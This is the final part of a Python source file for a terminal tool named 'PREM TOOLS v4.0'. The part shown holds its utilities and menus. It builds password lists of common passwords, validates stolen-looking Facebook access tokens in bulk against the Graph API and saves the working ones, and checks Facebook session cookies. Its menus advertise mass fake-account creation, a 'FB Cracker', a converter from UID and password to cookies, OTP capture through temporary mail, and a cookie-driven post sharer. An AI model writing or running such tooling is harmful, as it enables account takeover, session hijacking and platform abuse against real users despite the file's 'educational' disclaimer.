    try: n = int(prompt("How many passwords?").strip())
    except: print(f"{R}  ✗  Invalid{RESET}"); press_enter(utilities_menu); return
    linex()
    print(f"  {_A}[1]{W}  Strong  {_A}[2]{W}  Numeric  {_A}[3]{W}  Letters  {_A}[4]{W}  Common"); linex()
    t = prompt("TYPE (1/2/3/4)").strip()
    pws = []
    for _ in range(n):
        if   t=='2': pws.append(''.join(random.choices(string.digits, k=ri(6,10))))
        elif t=='3': pws.append(''.join(random.choices(string.ascii_letters, k=ri(8,12))))
        elif t=='4': pws.append(random.choice(['123456','password','111111','12345678','abc123','qwerty','letmein','iloveyou']))
        else:        pws.append(rand_pass())
    path = os.path.join(CFG['base'], CFG['f_pwlist'])
    with open(path,'a') as f: f.write('\n'.join(pws)+'\n')
    linex(); print(f"{G}  ✓  {n} passwords saved → {path}{RESET}"); linex()
    for pw in pws[:10]: print(f"  {G}→  {W}{pw}")
    if n>10: print(f"  {D}  ... {n-10} more{RESET}")
    linex(); press_enter(utilities_menu)

def token_check():
    banner(); sec_hdr("T O K E N   V A L I D A T O R", Y); linex()
    print(f"{Y}  ▸  Paste tokens. Blank line to start.{RESET}"); linex()
    toks = []
    while True:
        l = input(f"{_H}  [{_A}›{_H}]{W} Token: ").strip()
        if not l: break
        toks.append(l)
    if not toks: press_enter(utilities_menu); return
    linex(); valid = []
    for tok in toks:
        try:
            r = requests.get(f"https://graph.facebook.com/me?access_token={tok}&fields=id,name",
                             timeout=10, headers={'User-Agent': uagen()}).json()
            if 'id' in r:
                print(f"{G}  ✓  VALID   {_X}│  {W}{r.get('name','?'):<28}{_X}│  {_A}{tok[:45]}...")
                valid.append(tok)
                save(f"{r.get('id','?')}|{r.get('name','?')}|{tok}", CFG['f_tok_valid'])
            else:
                print(f"{R}  ✗  INVALID {_X}│  {D}{r.get('error',{}).get('message','?')[:45]}")
        except Exception as e: print(f"{R}  ✗  Error: {e}{RESET}")
    linex(); print(f"{W}  {G}Valid:{len(valid)}  {R}Invalid:{len(toks)-len(valid)}{RESET}"); linex()
    press_enter(utilities_menu)

def file_mgr():
    while True:
        banner(); sec_hdr("F I L E   M A N A G E R", Y); linex()
        files = []
        for fn in os.listdir(CFG['base']):
            fp = os.path.join(CFG['base'], fn)
            if os.path.isfile(fp):
                sz = os.path.getsize(fp)
                try: lc = sum(1 for _ in open(fp,'r',errors='ignore'))
                except: lc = 0
                files.append((fn, sz, lc))
        if not files: print(f"{Y}  ▸  No files yet{RESET}"); press_enter(utilities_menu); return
        print(f"{W}  {'#':<4}  {'FILENAME':<32}  {'SIZE':>8}  {'LINES':>6}")
        linex()
        for i,(fn,sz,lc) in enumerate(files,1):
            ss = f"{sz//1024}KB" if sz>=1024 else f"{sz}B"
            print(f"  {_A}[{i:02d}]{W}  {fn:<32}  {ss:>8}  {G}{lc:>6}{RESET}")
        linex()
        print(f"  {_A}[V]{W}  View   {_A}[D]{W}  Delete   {R}[0]{W}  Back"); linex()
        ch = prompt("SELECT").strip().upper()
        if ch == 'V':
            try:
                idx = int(prompt("File #").strip())-1
                fp  = os.path.join(CFG['base'], files[idx][0])
                linex(); print(f"{Y}  ▸  {files[idx][0]}{RESET}"); linex()
                with open(fp,'r',errors='ignore') as f:
                    for i,l in enumerate(f):
                        if i>=50: print(f"{D}  ... (truncated at 50){RESET}"); break
                        print(f"  {D}{i+1:>4}{_X}│{W}  {l.rstrip()}")
                linex(); press_enter()
            except (ValueError,IndexError): bad()
        elif ch == 'D':
            try:
                idx = int(prompt("File #").strip())-1
                fp  = os.path.join(CFG['base'], files[idx][0])
                if prompt(f"Delete {files[idx][0]}? (yes/no)").strip().lower() == 'yes':
                    os.remove(fp); print(f"{G}  ✓  Deleted{RESET}"); sleep(0.6)
            except (ValueError,IndexError): bad()
        elif ch == '0': break
        else: bad()

def cookie_fmt():
    while True:
        banner(); sec_hdr("C O O K I E   F O R M A T T E R", V); linex()
        print(f"  {_A}[1]{W}  String → JSON")
        print(f"  {_A}[2]{W}  JSON   → String")
        print(f"  {_A}[3]{W}  Validate (check c_user / xs)")
        print(f"  {R}[0]{W}  Back"); linex()
        ch = prompt("SELECT").strip()
        if ch == '1':
            raw = prompt("Cookie string").strip()
            pairs = {p.split('=')[0].strip(): p.split('=')[1].strip() for p in raw.split(';') if '=' in p}
            out  = json.dumps(pairs, indent=2)
            linex(); print(f"{G}  ✓  JSON:{RESET}\n{_A}{out}{RESET}")
            with open(os.path.join(CFG['base'],'cookies_json.json'),'w') as f: f.write(out)
            press_enter()
        elif ch == '2':
            print(f"{Y}  ▸  Paste JSON, blank line to end:{RESET}")
            lines_j = []
            while True:
                l = input(f"{_H}  [{_A}›{_H}]{W} ").strip()
                if not l: break
                lines_j.append(l)
            try:
                d   = json.loads(' '.join(lines_j))
                cstr= '; '.join(f"{k}={v}" for k,v in d.items())
                linex(); print(f"{G}  ✓  Cookie string:{RESET}")
                for ch_ in [cstr[i:i+80] for i in range(0,len(cstr),80)]: print(f"  {_A}{ch_}{RESET}")
                with open(os.path.join(CFG['base'],'cookies_str.txt'),'a') as f: f.write(cstr+'\n')
            except Exception as e: print(f"{R}  ✗  {e}{RESET}")
            press_enter()
        elif ch == '3':
            raw  = prompt("Cookie string").strip()
            pairs= {p.split('=')[0].strip(): p.split('=')[1].strip() for p in raw.split(';') if '=' in p}
            cu   = pairs.get('c_user',''); xs = pairs.get('xs','')
            linex()
            print(f"{W}  {_X}│  {Y}c_user   {_X}│  {(G+'✓ '+cu) if cu else (R+'✗ missing')}{RESET}")
            print(f"{W}  {_X}│  {Y}xs       {_X}│  {(G+'✓ '+xs[:30]) if xs else (R+'✗ missing')}{RESET}")
            print(f"{W}  {_X}│  {Y}Total    {_X}│  {C}{len(pairs)} pairs")
            ok = bool(cu and xs)
            print(f"{W}  {_X}│  {Y}Status   {_X}│  {(G+'LIKELY VALID') if ok else (R+'LIKELY INVALID')}{RESET}")
            if cu: yr=acc_year(cu); print(f"{W}  {_X}│  {Y}Est.Year {_X}│  {C}{yr or '?'}")
            linex(); press_enter()
        elif ch == '0': break
        else: bad()

def net_info():
    banner(); sec_hdr("N E T W O R K   &   I P   I N F O", V); linex()
    print(f"{C}  [~]  Fetching...{RESET}", end='', flush=True)
    d = get_ip_detail()
    print(f"\r{G}  [+]  Done!{' '*30}")
    linex()
    print(f"{_H}  ╔══════════════════════════════════════════════════════╗")
    print(f"{_H}  ║{V}{BOLD}           YOUR NETWORK INFORMATION                    {RESET}{_H}║")
    print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
    for label, key in [("IP Address","ip"),("City","city"),("Region","region"),
                        ("Country","country_name"),("Timezone","timezone"),
                        ("ISP / Org","org"),("ASN","asn")]:
        print(f"{W}  {_X}│  {Y}{label:<12}{_X}│  {W}{str(d.get(key,'Unknown'))[:48]}")
    print(f"{W}  {_X}│  {Y}{'Date/Time':<12}{_X}│  {D}{now_str()}")
    print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
    linex(); print(f"{Y}  ▸  Connectivity check...{RESET}")
    for host, port in [('graph.facebook.com',443),('b-graph.facebook.com',443),
                        ('b-api.facebook.com',443),('www.facebook.com',443),
                        ('api.mail.tm',443),('www.1secmail.com',443)]:
        try:
            sock = socket.create_connection((host, port), timeout=4); sock.close()
            status = f"{G}● REACHABLE{RESET}"
        except: status = f"{R}● UNREACHABLE{RESET}"
        print(f"  {_X}│  {W}{host:<36}{status}")
    linex(); press_enter(utilities_menu)

def about_scr():
    banner()
    print(f"{_H}  ╔══════════════════════════════════════════════════════╗")
    print(f"{_H}  ║{M}{BOLD}       ◈  A B O U T   P R E M   T O O L S  ◈      {RESET}{_H}  ║")
    print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
    print(f"{_H}  ║  {Y}Version   {_X}│{W}  v4.0 Premium All-in-One               {_H}║")
    print(f"{_H}  ║  {Y}Modules   {_X}│{W}  8 fully integrated tools              {_H}║")
    print(f"{_H}  ║  {Y}Language  {_X}│{W}  Python 3.x                            {_H}║")
    print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
    print(f"{_H}  ║  {G}[A]{W}  Auto Create  · 15-worker fast threads            {_H}║")
    print(f"{_H}  ║  {G}[B]{W}  2FA Manager  · TOTP Gen + Save                  {_H}║")
    print(f"{_H}  ║  {G}[C]{W}  Utilities    · UID / PW / Token / Cookie        {_H}║")
    print(f"{_H}  ║  {G}[D]{W}  Cookies Ext  · UID+Pass → Full Cookies          {_H}║")
    print(f"{_H}  ║  {G}[E]{W}  TempMail OTP · Mail.tm + 1secmail + Guerrilla   {_H}║")
    print(f"{_H}  ║  {G}[F]{W}  Create Mail  · TempMail + OTP Creation          {_H}║")
    print(f"{_H}  ║  {G}[G]{W}  FB Cracker   · Full cookie/key/token output     {_H}║")
    print(f"{_H}  ║  {G}[H]{W}  Share Tool   · Cookie-based post sharer         {_H}║")
    print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
    print(f"{_H}  ║  {D}For educational and research purposes only.          {_H}║")
    print(f"{_H}  ╚══════════════════════════════════════════════════════╝{RESET}")
    linex(); press_enter(utilities_menu)

def utilities_menu():
    while True:
        banner()
        print(f"{_H}  ╔══════════════════════════════════════════════════════╗")
        print(f"{_H}  ║{Y}{BOLD}              ◈  U T I L I T I E S  ◈             {RESET}{_H}    ║")
        print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
        print(f"{_H}  ║  {_A}[1]{W}  UID Info Checker                               {_H}║")
        print(f"{_H}  ║  {_A}[2]{W}  Password List Generator                        {_H}║")
        print(f"{_H}  ║  {_A}[3]{W}  Token Validator                                {_H}║")
        print(f"{_H}  ║  {_A}[4]{W}  Results File Manager                           {_H}║")
        print(f"{_H}  ║  {_A}[5]{W}  Cookie Formatter                               {_H}║")
        print(f"{_H}  ║  {_A}[6]{W}  Network & IP Info                              {_H}║")
        print(f"{_H}  ║  {_A}[7]{W}  About / Credits                                {_H}║")
        print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
        print(f"{_H}  ║  {R}[0]{W}  Back                                            {_H}║")
        print(f"{_H}  ╚══════════════════════════════════════════════════════╝{RESET}")
        linex()
        ch = prompt("SELECT").strip()
        if   ch == '1': uid_info()
        elif ch == '2': pwlist_gen()
        elif ch == '3': token_check()
        elif ch == '4': file_mgr()
        elif ch == '5': cookie_fmt()
        elif ch == '6': net_info()
        elif ch == '7': about_scr()
        elif ch == '0': main_menu()
        else: bad()

# ==================================================================
# SECTION 17 – MAIN MENU
# ==================================================================
def main_menu():
    while True:
        banner()
        print(f"{_H}  ╔══════════════════════════════════════════════════════╗")
        print(f"{_H}  ║{M}{BOLD}  (BY NIKA BREVOUR)    ◈  M A I N   M E N U  ◈             {RESET}{_H}    ║")
        print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
        print(f"{_H}  ║  {_A}[A]{W}  Auto Create FB     · Fast 15-thread           {_H}║")
        print(f"{_H}  ║  {_A}[B]{W}  2FA Manager        · TOTP Code Generator      {_H}║")
        print(f"{_H}  ║  {_A}[C]{W}  Utilities          · Tools & Info             {_H}║")
        print(f"{_H}  ║  {_A}[D]{W}  Cookies Extractor  · UID+Pass → Cookies       {_H}║")
        print(f"{_H}  ║  {_A}[E]{W}  TempMail OTP       · Receive OTP (3 backends) {_H}║")
        print(f"{_H}  ║  {G}[F]{W}  Create via Mail    · TempMail + OTP           {_H}║")
        print(f"{_H}  ║  {R}[G]{W}  FB Cracker         · Full output              {_H}║")
        print(f"{_H}  ║  {C}[H]{W}  Share Tool         · Cookie post sharer       {_H}║")
        print(f"{_H}  ╠══════════════════════════════════════════════════════╣")
        print(f"{_H}  ║  {R}[0]{W}  Exit                                            {_H}║")
        print(f"{_H}  ╚══════════════════════════════════════════════════════╝{RESET}")
        linex()
        ch = prompt("SELECT").strip().upper()
        if   ch in ('A','1'): auto_create_menu()
        elif ch in ('B','2'): two_fa_menu()
        elif ch in ('C','3'): utilities_menu()
        elif ch in ('D','4'): coki_ext()
        elif ch in ('E','5'): tempmail_otp()
        elif ch in ('F','6'): createfb_with_tempmail()
        elif ch in ('G','7'): cracker_menu()
        elif ch in ('H','8'): share_tool_menu()
        elif ch in ('0','Q','EXIT'):
            print(f"\n{_H}  ╌╌╌  {C}{BOLD} Goodbye · PREM TOOLS v4.0  {RESET}{_H}╌╌╌{RESET}\n")
            sys.exit(0)
        else: bad()

# ==================================================================
# SECTION 18 – ENTRY POINT
# ==================================================================
if __name__ == '__main__':
    sys.stdout.write('\x1b]2; PREM TOOLS v4.0 · PREMIUM\x07')
    sys.stdout.flush()
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{_H}  ╌╌╌  {C}{BOLD} Goodbye · PREM TOOLS  {RESET}{_H}╌╌╌{RESET}\n")
        sys.exit(0)
